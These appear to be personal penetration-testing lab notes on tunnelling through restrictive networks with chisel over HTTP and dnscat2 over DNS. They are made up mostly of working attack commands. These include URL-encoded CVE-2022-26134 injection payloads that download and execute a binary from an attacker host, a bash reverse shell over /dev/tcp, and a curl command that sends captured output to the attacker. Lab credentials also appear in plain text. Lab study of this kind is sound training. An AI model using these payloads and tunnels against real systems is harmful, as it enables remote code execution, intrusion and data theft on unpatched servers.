### http tunneling using chisel
- encapsulates tunnel in http, ssh encrypted using socks proxy
- Use reverse port forwarding, which is similar to SSH remote port forwarding
- we would use this if all outbound ports except HTTP are blocked as well as all incoming ports except TCP 8090 (for example)
- this situation would prevent us from using a regular reverse shell or SSH port forward
- must resemble an outgoing HTTP connection from our target if we want a connection

### Get chisel onto the host using apache
- This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH
- we will run a chisel server on kali, which accepts a connection from a chisel client on the target
- chisel binds a SOCKS proxy port on kali
- chisel server encapsulates whatever we send through SOCKS port and push it through the HTTP tunnel
- chisel client decapsulates it and push where addressed
- since traffic between client and server is HTTP, we can get around the DPI restrictions

```
sudo cp $(which chisel) /var/www/html/
```

 inject this payload
```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel

curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.181/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

test that we see the request
```
tail -f /var/log/apache2/access.log
```

start chisel server
```
chisel server --port 8080 --reverse
```

use tcpdump to inspect packets on our port
```
sudo tcpdump -nvvvXi tun0 tcp port 8080
```


use chisel with the injection (send to background which frees up our shell)
```
/tmp/chisel client 192.168.45.181:8080 R:socks > /dev/null 2>&1 &
```

encoded payload from above to use the vulnerability present on the target
```
curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.181:8080%20R:socks%27%29.start%28%29%22%29%7D/
```


get some more log output
```
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/

curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.181:8080/%27%29.start%28%29%22%29%7D/
```

looks like we need a new chisel
```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp ./chisel /var/www/html
```

run upload and chisel commands again and verify we now have a listener
```
ss -ntplu
```


you can't use SSH with proxychains. So instead we need to use ProxyCommand config option for ssh
- need to use ncat instead of netcat as netcat shipped with kali doesn't support proxying
- %h and %p are the host and port, which ssh fills in before running the command
- finally we can connect to the machine - sqlpass123
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.195.215
```

### VM 2
```
curl http://192.168.246.63:8090/exercises/chisel_exercise_client -o chisel_exercise_client
```

upload chisel (this one required normal version of chisel)
```
curl http://192.168.246.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.181/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

start listener
```
curl http://192.168.246.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.181:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

edit proxychains conf to use port 1080
```
proxychains ./chisel_exercise_client -i 10.4.246.215 -p 8008
```

### DNS tunneling - dnscat2
- DNS server makes recursive queries to nameservers over udp port 53
- dns query = root -> authoritative -> TLD -> A record

get reverse shell using  CVE-2022-26134 on the first host
```
curl -v http://192.168.246.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/4444%200%3E%261%27%29.start%28%29%22%29%7D/
nc -nvlp 4444
```

set up remote port forwarding
```
sudo systemctl start ssh
sudo ss -ntplu
```

on client
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -R 127.0.0.1:2347:10.4.246.215:22 kali@192.168.45.181
# sqlpass123
ssh database_admin@127.0.0.1 -p2347
```

ssh into felineauthority - 7he_C4t_c0ntro11er
```
ssh kali@192.168.246.7
```

on felineauthority
```
cd dns_tunneling
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf -d
sudo tcpdump -i ens192 udp port 53
cat dnsmasq_txt.conf
sudo dnsmasq -C dnsmasq_txt.conf -d
```

on pgdb - test making dns queries
```
resolvectl status
nslookup exfiltrated-data.feline.corp
nslookup -type=txt www.feline.corp
nslookup -type=txt give-me.cat-facts.internal
```

troubleshoot
```
resolvectl flush-caches
nslookup exfiltrated-data.feline.corp 192.168.246.64
```
### VM set 2 - same setup
`curl http://192.168.246.63:8090/exercises/dnscat_exercise_client -o dnscat_exercise_client`

on feline
```
sudo tcpdump -i ens192 udp port 53
```

run dnscat from pg
```
./dnscat feline.corp
```

run DNS server
```
dnscat2-server feline.corp
dnscat2> windows
dnscat2> window -i 1 # open up session on pgdb
```

now tunnel to hrshares
```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.246.217:445
command (pgdatabase01) 1> listen 0.0.0.0:4456 172.16.246.217:4646
```

on feline open smb
```
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
./dnscat_exercise_client -i 192.168.246.7 -p 4456
```











